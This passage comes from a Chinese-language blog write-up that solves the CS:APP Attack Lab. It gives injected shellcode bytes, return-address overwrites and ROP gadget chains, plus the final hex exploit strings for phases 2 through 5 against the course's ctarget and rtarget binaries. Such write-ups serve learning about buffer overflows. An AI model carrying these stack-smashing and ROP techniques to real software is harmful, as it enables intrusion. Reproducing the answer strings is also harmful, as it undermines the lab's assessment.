	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00

</code></pre></div></div> <h2 id="phase-2">Phase 2</h2> <p>第二个阶段要求带参数进入<code class="language-plaintext highlighter-rouge">touch2</code>函数，<code class="language-plaintext highlighter-rouge">%rdi</code>作为第一个参数传递。</p> <p>问题在于，现在我们可以利用缓冲区溢出，修改上一个栈帧的栈顶，也就是ret指令的返回值。</p> <p>但是如何执行参数赋值呢？</p> <p>正常来说带参数调用函数，应该是先对参数赋值，然后进入函数。</p> <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">movl</span> <span class="kc">$</span><span class="nv">cookie</span><span class="p">,</span> <span class="o">%</span><span class="nb">edi</span>
<span class="nf">call</span> <span class="o">&lt;</span><span class="nv">touch2</span><span class="o">&gt;</span>
</code></pre></div></div> <p>问题就在于如何插入这个movl的攻击代码。</p> <p>我们唯一能输入的内容只有缓冲区，所以一定在缓冲区内插入我们的代码（而且writeup的提示很明显，让我们使用gcc -c选项和objdump -d来手动获取一个汇编指令的字节码）</p> <p>根据第一个阶段的注入，我们可以让ret的地址，绕回这个缓冲区，也就是让<code class="language-plaintext highlighter-rouge">%rip</code>（又名程序计数器PC）来指向这个区域，然后逐条执行攻击代码。</p> <p>例如下面的输入。假设%rsp在getbuf函数中，值为0xabcde0</p> <p>那么可以让前一个栈帧（test函数）的栈顶改成0xabcde0</p> <p>从而<code class="language-plaintext highlighter-rouge">getbuf</code>内部的ret指令执行时，PC指向0xabcde0，那么这里开始只要注入代码，就可以照常执行攻击代码，从而对<code class="language-plaintext highlighter-rouge">%rdi</code>赋值cookie</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00 00 00 00 00 00 00 00     # 假设这里的地址是0xabcde0  &lt;- %rsp
00 00 00 00 00 00 00 00     # 那么这里的地址是0xabcde8
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00     # 到这里填充完getbuf的栈帧
e0 cd ab 00 00 00 00 00     # 这里篡改了ret的返回函数地址 &lt;- %rsp + 0x28
</code></pre></div></div> <p>需要注意的是，执行完了movl给第一个参数赋值cookie，我们要跳转到<code class="language-plaintext highlighter-rouge">touch2</code>: 0x4017ec的位置</p> <p>writeup中说明了，最好不要使用call或者jmp指令，所以我们仍然使用ret指令。</p> <p>当<code class="language-plaintext highlighter-rouge">getbuf</code>内部的ret指令执行完毕后，PC指向攻击代码的部分，同时，%rsp指向原本栈帧<code class="language-plaintext highlighter-rouge">test</code>函数的部分</p> <p>为了跳转<code class="language-plaintext highlighter-rouge">touch2</code>，我们要push一次<code class="language-plaintext highlighter-rouge">touch2</code>的地址。</p> <p>所以初步的攻击代码如下:</p> <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">movl</span>    <span class="kc">$</span><span class="mh">0x59b997fa</span><span class="p">,</span> <span class="o">%</span><span class="nb">edi</span>
<span class="nf">pushq</span>   <span class="kc">$</span><span class="mh">0x4017ec</span>
<span class="nf">ret</span>
</code></pre></div></div> <p>将其转为字节码后，作为输入的字符串。</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">touch </span>attack2.s
vim attack2.s     <span class="c"># 编辑代码</span>
gcc <span class="nt">-c</span> attack2.s
objdump <span class="nt">-d</span> attack2.o
</code></pre></div></div> <p>得到:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>attack2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &lt;.text&gt;:
   0:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi
   5:	68 ec 17 40 00       	pushq  $0x4017ec
   a:	c3                   	retq
</code></pre></div></div> <p>同时，需要知道当程序运行到<code class="language-plaintext highlighter-rouge">getbuf</code>时，<code class="language-plaintext highlighter-rouge">%rsp</code>寄存器的值，因为我们需要绕回到这个地址然后逐行执行攻击代码。</p> <p>在<code class="language-plaintext highlighter-rouge">getbuf</code>第二行汇编处断点，用gdb调试打印<code class="language-plaintext highlighter-rouge">%rsp</code>寄存器的值即可。</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> i r rsp
0x5561dc78
</code></pre></div></div> <p>所以level2的注入代码如下:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bf fa 97 b9 59 68 ec 17
40 00 c3 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
</code></pre></div></div> <h2 id="phase-3">Phase 3</h2> <p>首先读懂要做什么，请仔细阅读writeup.</p> <p>其实就是getbuf结束后，不回到test函数，而是调用touch3，同时传入字符串。这个字符串的值要求是cookie的ascii表示:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cookie: 0x59b997fa
hex:    35 39 62 39 39 37 66 61 # 这个作为字符串存放在内存的某个位置
</code></pre></div></div> <p>梳理一下内容，首先我们在test函数中调用了getbuf函数。</p> <p>然后有了这样的栈帧结构:</p> <p>(高地址在第一行, 注意下面是栈的结构)</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?? ?? ?? ?? ?? ?? ?? ?? # test函数的栈帧
[ret address (64bit)]   # getbuf函数结束后ret的参考地址 这里是%rsp + 0x28
xx xx xx xx xx xx xx xx # getbuf分配了0x28 * 64bit的空间(64位机器)
xx xx xx xx xx xx xx xx #
xx xx xx xx xx xx xx xx #
xx xx xx xx xx xx xx xx #
xx xx xx xx xx xx xx xx # &lt;- %rsp的位置 同时也是缓冲区输入的位置
</code></pre></div></div> <p>按照level2的攻击方式，我们先把最后一行填充完毕，然后覆盖掉<code class="language-plaintext highlighter-rouge">ret address</code>的地址，让%rip指向上面的最后一行，也就是注入的代码。从而执行攻击代码。</p> <p>但是writeup中提及，当<code class="language-plaintext highlighter-rouge">hexmatch</code>和<code class="language-plaintext highlighter-rouge">strncmp</code>调用的时候，会push数据到栈中。</p> <p>下面是<code class="language-plaintext highlighter-rouge">getbuf</code>执行完毕后栈的情况:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?? ?? ?? ?? ?? ?? ?? ?? # test函数的栈帧 &lt;- %rsp的位置
[ret address (64bit)]   # 因为ret将%rip的位置设置到了这一行的地址
xx xx xx xx xx xx xx xx # getbuf分配了0x28 * 64bit的空间(64位机器)
xx xx xx xx xx xx xx xx #
xx xx xx xx xx xx xx xx #
xx xx xx xx xx xx xx xx #
xx xx xx xx xx xx xx xx # &lt;- %rip 即将要执行的攻击代码
</code></pre></div></div> <p>假如我们攻击代码要开始调用<code class="language-plaintext highlighter-rouge">touch3</code>了，然后内部再次调用<code class="language-plaintext highlighter-rouge">hexmatch</code>和<code class="language-plaintext highlighter-rouge">strncmp</code>函数。(这时候已经执行到攻击代码的最后一行ret)</p> <p>稍微查看<code class="language-plaintext highlighter-rouge">hexmatch</code>就会发现，它居然push了一堆东西，并且让%rsp减了0x80，这让我们的攻击代码被覆盖。</p> <p>其实代码被覆盖没有问题，因为我们在<code class="language-plaintext highlighter-rouge">gebuf</code>执行完毕之后，执行了一遍攻击代码，然后<code class="language-plaintext highlighter-rouge">ret</code>到我们设定的<code class="language-plaintext highlighter-rouge">touch3</code>位置。</p> <p>但是我们输入的字符串数据将会被覆盖，这就是要解决的问题。显然继续往栈顶放置字符串不妥，因为我们不清楚栈被push了多少内容。那就牺牲test函数的栈顶了。(<code class="language-plaintext highlighter-rouge">?</code>的位置)</p> <p>所以，这一次，我们需要将字符串作为参数，存放在test函数栈帧的栈顶位置(通过gebuf的缓冲区溢出来存放)，ret的地址设定为<code class="language-plaintext highlighter-rouge">touch3</code>的函数位置(通过攻击代码的push)。</p> <p>因为我们要手动填写<code class="language-plaintext highlighter-rouge">??</code>那一行，<code class="language-plaintext highlighter-rouge">touch3</code>的第一个参数<code class="language-plaintext highlighter-rouge">%rdi</code>要填入<code class="language-plaintext highlighter-rouge">??</code>那一行的地址。通过前文，或者gdb直接打印地址就行:<code class="language-plaintext highlighter-rouge">0x5561dca8</code></p> <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">mov</span>   <span class="kc">$</span><span class="mh">0x5561dca8</span><span class="p">,</span> <span class="o">%</span><span class="nb">rdi</span>
<span class="nf">push</span>  <span class="kc">$</span><span class="mh">0x4018fa</span>
<span class="nf">ret</span>
</code></pre></div></div> <p>获取这段代码的字节码：</p> <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nl">attack3.o:</span>     <span class="nf">file</span> <span class="nv">format</span> <span class="nv">elf64</span><span class="o">-</span><span class="nv">x86</span><span class="o">-</span><span class="mi">64</span>


<span class="nf">Disassembly</span> <span class="nv">of</span> <span class="nv">section</span> <span class="nv">.text</span><span class="p">:</span>

<span class="err">0000000000000000</span> <span class="o">&lt;</span><span class="nf">.text</span><span class="o">&gt;</span><span class="p">:</span>
   <span class="err">0</span><span class="p">:</span>	<span class="err">48</span> <span class="nf">c7</span> <span class="nv">c7</span> <span class="nv">a8</span> <span class="nv">dc</span> <span class="mi">61</span> <span class="mi">55</span> 	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x5561dca8</span><span class="p">,</span><span class="o">%</span><span class="nb">rdi</span>
   <span class="err">7</span><span class="p">:</span>	<span class="err">68</span> <span class="nf">fa</span> <span class="mi">18</span> <span class="mi">40</span> <span class="mi">00</span>       	<span class="nv">pushq</span>  <span class="kc">$</span><span class="mh">0x4018fa</span>
   <span class="nl">c:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>

</code></pre></div></div> <p>所以答案<code class="language-plaintext highlighter-rouge">phase3.txt</code>是:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>48 c7 c7 a8 dc 61 55 68 # 攻击代码从这里开始 %rip是逐行执行
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 # getbuf结束后ret返回攻击代码的第一行
35 39 62 39 39 37 66 61 # 覆盖test函数栈帧，安全存放字符串
</code></pre></div></div> <h1 id="part-2">Part 2</h1> <p>前面每次运行<code class="language-plaintext highlighter-rouge">ctarget</code>的时候，栈的地址都是一样的。</p> <p>但是这里<code class="language-plaintext highlighter-rouge">rtarget</code>加入了栈随机化。</p> <p>这就导致了<code class="language-plaintext highlighter-rouge">phase2</code>和<code class="language-plaintext highlighter-rouge">phase3</code>很难再通过找到<code class="language-plaintext highlighter-rouge">%rsp</code>的地址来执行我们自己注入的代码。因为每次运行<code class="language-plaintext highlighter-rouge">%rsp</code>的值都不一样。</p> <p>所以得根据writeup中的<code class="language-plaintext highlighter-rouge">ROP</code>策略利用已有的字节码来执行需要的操作。</p> <p>利用<code class="language-plaintext highlighter-rouge">farm.c</code>的代码，来看看有没有什么灵感。</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-c</span> farm.c
objdump <span class="nt">-d</span> farm.o <span class="o">&gt;</span> farm.asm
</code></pre></div></div> <h2 id="phase-4">Phase 4</h2> <p>要求实现跟<code class="language-plaintext highlighter-rouge">Phase 2</code>一样的操作，只不过是在<code class="language-plaintext highlighter-rouge">rtarget</code>上运行。</p> <p>并且只能使用前八个寄存器.(<code class="language-plaintext highlighter-rouge">%rax</code> ~ <code class="language-plaintext highlighter-rouge">%rdi</code>)</p> <p>查看<code class="language-plaintext highlighter-rouge">rtarget</code>的反编译结果，跟<code class="language-plaintext highlighter-rouge">ctarget</code>没什么两样，问题就在于我们不能注入代码了，因为加入了栈随机化，我们不知道我们注入的代码在栈的地址。</p> <p>总体而言的操作和<code class="language-plaintext highlighter-rouge">Phase 2</code>一样:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>attack2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &lt;.text&gt;:
   0:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi
   5:	68 ec 17 40 00       	pushq  $0x4017ec
   a:	c3                   	retq
</code></pre></div></div> <p>然后我们能够控制的就是缓冲区的输入，替换掉ret的地址，然后一直链式反应，执行我们的代码.</p> <p>比如<code class="language-plaintext highlighter-rouge">ret</code>的字节码是<code class="language-plaintext highlighter-rouge">c3</code>, <code class="language-plaintext highlighter-rouge">nop</code>的字节码是<code class="language-plaintext highlighter-rouge">90</code></p> <p>那么我们需要有这样的栈结构（尽管会破坏test函数栈）:</p> <p>当<code class="language-plaintext highlighter-rouge">getbuf</code>执行完毕，<code class="language-plaintext highlighter-rouge">%rsp</code>加上<code class="language-plaintext highlighter-rouge">0x28</code>然后指向下面的<code class="language-plaintext highlighter-rouge">address</code></p> <p>然后进行<code class="language-plaintext highlighter-rouge">ret</code>指令</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>address + 0x8: [gadget 2的地址]
address:       [gadget 1的地址]  # &lt;- %rsp 即将ret跳转到gadget1
--------上面是栈的结构----------

gadget 1: bf fa 97 b9 59 c3 # mov &lt;cookie&gt;, %edi; ret
gadget 2: 68 ec 17 40 00 c3 # pushq $0x4017ec; ret然后进入touch2
</code></pre></div></div> <p>那么一目了然，只需要找到这样的字节码就行，然后在缓冲区输入gadgets的地址就行。</p> <p>很遗憾我并没有从<code class="language-plaintext highlighter-rouge">farm</code>相关的字节码找到最核心的<code class="language-plaintext highlighter-rouge">0x4017ec</code>和<code class="language-plaintext highlighter-rouge">0x59b997fa</code></p> <p>所以我们必须在缓冲区输入这个地址，然后利用<code class="language-plaintext highlighter-rouge">pop</code>指令，让某个寄存器存放这个值（touch3的地址或者cookie值）</p> <p>所以进一步推理栈的结构很可能是这:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>address + 0x10:[touch2的地址]
address + 0x8: [cookie的值]
address:       [gadget 1的地址]  # &lt;- %rsp 即将ret跳转到gadget1
--------上面是栈的结构----------

gadget 1: popq %rdi;            # 将cookie存放在rdi中
gadget 2: ret;                  # 然后ret进入touch2
</code></pre></div></div> <p>让我们梳理一下，按照上述的栈结构，发生了什么。</p> <p>当我们输入好攻击的内容后，栈变成上述内容。然后<code class="language-plaintext highlighter-rouge">getbuf</code>即将返回，<code class="language-plaintext highlighter-rouge">%rsp</code>指向ret的地址(已经被我们篡改成gadet 1的地址)。然后<code class="language-plaintext highlighter-rouge">%rsp</code>再次加0x8，同时我们进入gadet1，执行<code class="language-plaintext highlighter-rouge">pop</code>指令把cookie存在<code class="language-plaintext highlighter-rouge">%rdi</code>。pop指令一执行，<code class="language-plaintext highlighter-rouge">%rsp</code>再次加0x8然后，再紧接着执行gadget2的<code class="language-plaintext highlighter-rouge">ret</code>，也就是进入<code class="language-plaintext highlighter-rouge">touch3</code></p> <p>也就是，我们需要这样的gadgets:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>5f c3 # popq $rdi; ret;
</code></pre></div></div> <p>在<code class="language-plaintext highlighter-rouge">rtarget.asm</code>中，很容易找到:</p> <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="err">401419</span><span class="p">:</span> <span class="err">69</span> <span class="nf">c0</span> <span class="mi">5</span><span class="nv">f</span> <span class="nv">c3</span> <span class="mi">00</span> <span class="mi">00</span>            	<span class="nv">imull</span>	<span class="kc">$</span><span class="mh">0xc35f</span><span class="p">,</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span> <span class="o">%</span><span class="nb">eax</span>     <span class="err">#</span> <span class="nv">imm</span> <span class="err">=</span> <span class="mh">0xC35F</span>
</code></pre></div></div> <p>所以gadgets的地址是<code class="language-plaintext highlighter-rouge">0x40141b</code></p> <p>所以缓冲区输入<code class="language-plaintext highlighter-rouge">phase4.txt</code>:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
1b 14 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
ec 17 40 00 00 00 00 00
</code></pre></div></div> <p>精彩，不过为什么没用到<code class="language-plaintext highlighter-rouge">farm</code>的代码段呢，<em>无所谓了</em>。</p> <p>只要达到了攻击效果就行。</p> <p>（然而我仔细阅读了writeup之后发现，我们需要的字节码都能够在<code class="language-plaintext highlighter-rouge">start_farm</code>到<code class="language-plaintext highlighter-rouge">mid_farm</code>中找到, 其实就是pop到<code class="language-plaintext highlighter-rouge">%rax</code>中，然后再赋值给<code class="language-plaintext highlighter-rouge">%rdi</code>而已，只不过正好被我在别的程序段找到了更简洁的解法。）</p> <h2 id="phase-5">Phase 5</h2> <p>Phase5要求和Phase3一样，调用<code class="language-plaintext highlighter-rouge">touch3</code>并且传入字符串<code class="language-plaintext highlighter-rouge">cookie</code></p> <p>与Phase3不同的是，<code class="language-plaintext highlighter-rouge">rtarget</code>采用了栈随机化，导致我们的字符串若是存在栈中，我们需要解决栈的地址的问题。</p> <p>那么总体还是一样的，就是调用<code class="language-plaintext highlighter-rouge">touch3</code>之前，保证<code class="language-plaintext highlighter-rouge">%rdi</code>的值是字符串的地址。</p> <p>此外，还要将</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>35 39 62 39 39 37 66 61 # cookie的ASCII表示
</code></pre></div></div> <p>存在那个地址。</p> <p>然后将<code class="language-plaintext highlighter-rouge">touch3</code>的地址压入栈中，<code class="language-plaintext highlighter-rouge">ret</code>指令进入<code class="language-plaintext highlighter-rouge">touch3</code>:<code class="language-plaintext highlighter-rouge">0x4018fa</code></p> <p>但是，<code class="language-plaintext highlighter-rouge">rtarget</code>中，我相信一定不会有这样的内存区域正好存着cookie的ASCII，所以这一串仍然需要我们通过缓冲区溢出的漏洞，写入栈帧中。</p> <p>那么问题就在于，如何在栈随机化的程序上，明确<code class="language-plaintext highlighter-rouge">%rsp</code>的值呢？</p> <p>或者，我们只需要<code class="language-plaintext highlighter-rouge">%rsp</code>的值赋值给<code class="language-plaintext highlighter-rouge">%rdi</code>，然后对<code class="language-plaintext highlighter-rouge">%rdi</code>进行一些加减操作，偏移到我们存储的地方即可。</p> <p>并且注意到<code class="language-plaintext highlighter-rouge">farm.c</code>中正好就有定义<code class="language-plaintext highlighter-rouge">add_xy(long x, long y)</code>:并且在<code class="language-plaintext highlighter-rouge">rtarget.asm</code>中的<code class="language-plaintext highlighter-rouge">0x4019d6</code></p> <p>那么显然我们有这样的栈结构和操作:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>address + 0x28:[cookie的ASCII]  # &lt;- %rdi + 0x20
address + 0x20: [touch3的地址]
address + 0x18: [add_xy()的地址]
address + 0x10: [第二个参数:0x20]
address + 0x8: [gadget 3的地址]  # mov %rsp, %rdi之前，%rsp是在这
address:       [gadget 1的地址]  # &lt;- %rsp 即将ret跳转到gadget1
--------上面是栈的结构----------

gadget 1: mov %rsp, %rdi        # 获取%rsp的值 初始化add的第一个参数
gadget 2: ret                   # 进入gaget3
gadget 3: popq %rsi             # 初始化%rsi第二个参数为0x20
gadget 4: ret                   # 然后ret进入add_xy

# 进入add_xy之后ret
# %rax为加法结果: %rdi + 0x20

gadget 5: mov %rax, %rdi        # 加法结果保存为第一个参数
gadget 6: ret
</code></pre></div></div> <p>对照gadgets的指令有:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>48 49 e7 # mov %rsp, %rdi
c3       # ret
5e       # popq %rsi
c3       # ret
48 89 c7 # mov %rax, %rdi
c3       # ret
</code></pre></div></div> <p>其他指令都好找，就是<code class="language-plaintext highlighter-rouge">48 89 e7</code>找不到紧跟<code class="language-plaintext highlighter-rouge">c3</code>的。</p> <p>所以只能间接将<code class="language-plaintext highlighter-rouge">%rsp</code>传递给<code class="language-plaintext highlighter-rouge">%rdi</code></p> <p>先按照前缀找:<code class="language-plaintext highlighter-rouge">48 89</code></p> <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0000000000401</span><span class="nf">aab</span> <span class="o">&lt;</span><span class="nv">setval_350</span><span class="o">&gt;</span><span class="p">:</span>
  <span class="err">401</span><span class="nl">aab:</span> <span class="nf">c7</span> <span class="mi">07</span> <span class="mi">48</span> <span class="mi">89</span> <span class="nv">e0</span> <span class="mi">90</span>            	<span class="nv">movl</span>	<span class="kc">$</span><span class="mh">0x90e08948</span><span class="p">,</span> <span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">)</span>     <span class="err">#</span> <span class="nv">imm</span> <span class="err">=</span> <span class="mh">0x90E08948</span>
  <span class="err">401</span><span class="nl">ab1:</span> <span class="nf">c3</span>                           	<span class="nv">retq</span>
</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">48 89 e0</code>正好是<code class="language-plaintext highlighter-rouge">mov %rsp, %rax</code>是可以接受的，并且<code class="language-plaintext highlighter-rouge">90</code>是nop.</p> <p>那么还差一个<code class="language-plaintext highlighter-rouge">mov %rax, %rdi</code>是重复的。</p> <p>所以:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>address + 0x38: [cookie的ASCII]  # &lt;- %rdi + 0x30
address + 0x30: [touch3的地址]
address + 0x28: [gadget 6的地址]
address + 0x20: [add_xy()的地址]
address + 0x18: [第二个参数:0x28]
address + 0x10: [gadget 4的地址]
address + 0x08: [gadget 2的地址]  # mov %rsp, %rax时，%rsp在这
address       : [gadget 0的地址]  # &lt;- %rsp 即将ret跳转到gadget0
--------上面是栈的结构----------

gadget 0: mov %rsp, %rax        # 间接传递，先传给%rax
gadget 1: ret
gadget 2: mov %rax, %rdi        # 获取%rsp的值 初始化add的第一个参数
gadget 3: ret                   # 进入gadget4
gadget 4: popq %rsi             # 初始化%rsi第二个参数为0x30
gadget 5: ret                   # 然后ret进入add_xy:0x4019d6

# 进入add_xy之后ret
# %rax为加法结果: %rdi + 0x30

*gadget 6: mov %rax, %rdi        # 加法结果保存为第一个参数
*gadget 7: ret                   # 这是add_xy内部的ret
</code></pre></div></div> <p>那么<code class="language-plaintext highlighter-rouge">gadgets</code>的字节码及其地址有:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>48 89 e0 # mov %rsp, %rax -&gt; 0x401a06
c3       # ret
48 89 c7 # mov %rax, %rdi -&gt; 0x4019a2
c3       # ret
5e       # popq %rsi      -&gt; 0x401383
c3       # ret
48 89 c7 # mov %rax, %rdi -&gt; 0x4019a2
c3       # ret
</code></pre></div></div> <p>查找字节码在<code class="language-plaintext highlighter-rouge">rtarget.asm</code>的地址，得到缓冲区输入的内容有:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00 # 覆盖ret地址，gadget 0的地址
a2 19 40 00 00 00 00 00 # gadget 2的地址
83 13 40 00 00 00 00 00 # gadget 4的地址
30 00 00 00 00 00 00 00 # 第二个参数 0x30
d6 19 40 00 00 00 00 00 # add_xy的地址
a2 19 40 00 00 00 00 00 # gadget 6的地址
fa 18 40 00 00 00 00 00 # touch3的入口
35 39 62 39 39 37 66 61 # cookie的ASCII
</code></pre></div></div> <p>完结撒花。</p> <h1 id="总结">总结</h1> <p>对栈帧结构了解很多，深入理解了函数栈，以及缓冲区溢出攻击的方式。</p> <p>不得不感慨国内外CS教育的差距。</p>]]></content><author><name></name></author><category term="CSAPP"/><category term="项目"/><category term="c"/><category term="assembly"/><category term="csapp"/><category term="gdb"/><category term="buffer"/><category term="overflow"/><category term="attack"/><summary type="html"><![CDATA[Personal Crack on CS:APP3e Attack Lab]]></summary></entry></feed>